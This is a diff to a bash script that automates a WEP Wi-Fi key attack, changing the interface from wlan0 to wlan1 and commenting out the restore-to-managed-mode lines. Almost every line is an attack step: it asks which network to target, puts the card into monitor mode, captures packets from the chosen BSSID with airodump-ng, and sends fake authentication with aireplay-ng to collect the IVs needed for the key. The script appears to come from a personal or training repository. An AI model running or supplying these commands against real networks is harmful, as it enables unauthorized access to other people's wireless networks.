@@ -12,15 +12,15 @@
 # WEP uses RC4 where packet is encrypted at the AP and decrypted at the client
 # Must capture packets with the initializing vector (IV) to get the key
 
-ifconfig wlan0
+ifconfig wlan1
 
 echo "What is your MAC address?"
 read my_mac
 
-ifconfig wlan0 down
-iwconfig wlan0 mode monitor
+ifconfig wlan1 down
+iwconfig wlan1 mode monitor
 
-airodump-ng wlan0
+airodump-ng wlan1
 
 echo "What network do you want to target?"
 read host_mac
@@ -28,10 +28,10 @@ read host_mac
 echo "What channel is the network on?"
 read ch
 
-airodump-ng --bssid $host_mac --channel $ch wlan0 
+airodump-ng --bssid $host_mac --channel $ch wlan1 
 
-aireplay-ng --fakeauth 0 -a $host_mac -h $my_mac wlan0              			# fakeauth is number of packets to send
+aireplay-ng --fakeauth 0 -a $host_mac -h $my_mac wlan1              			# fakeauth is number of packets to send
 
-ifconfig wlan0 down
-iwconfig wlan0 mode managed
-ifconfig wlan0 up
+#ifconfig wlan0 down
+#iwconfig wlan0 mode managed
+#ifconfig wlan0 up
